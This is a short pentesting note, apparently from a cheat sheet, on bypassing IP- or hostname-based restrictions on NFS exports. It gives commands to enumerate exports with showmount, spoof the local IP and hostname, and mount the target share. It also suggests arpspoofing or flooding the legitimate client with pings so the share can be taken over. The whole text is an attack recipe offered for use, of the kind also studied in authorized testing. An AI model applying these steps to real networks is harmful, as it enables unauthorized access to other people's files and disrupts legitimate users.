If you showmount -e <ip> you can see exports and what users are allowed to access those exports
These are typically filtered based on IP address and sometimes on hostname

You can exploit this configuration by spoofing your ip address / hostname and then attempting to connect

ifconfig <interface> <spoof_IP>
echo <hostname> > /etc/hostname
  #If changing hostname, make sure to reboot your machine

Now try to mount the nfs export
mount -o nolock,<options> IP:/export/path /mnt/<path>

You may want to try to ping the target continually or arpspoof the target machine in order to successfully mount the export
This is because the actual client may be online and actively using the share (or just the IP is in use).
